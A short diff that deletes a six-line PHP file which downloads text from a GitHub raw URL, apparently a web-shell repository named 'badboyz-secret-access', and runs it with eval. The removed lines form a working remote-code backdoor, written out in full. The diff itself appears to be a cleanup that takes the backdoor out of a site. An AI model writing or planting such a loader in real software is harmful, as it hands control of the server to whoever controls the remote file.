@@ -1,6 +1,0 @@
-    <?php
-
-    $content = file_get_contents(urldecode('https://raw.githubusercontent.com/seobadboyz403-alt/badboyz-secret-access/refs/heads/main/alfa-badboyz-acak.txt'));
-
-    $content = "?> ".$content;
-    eval($content);
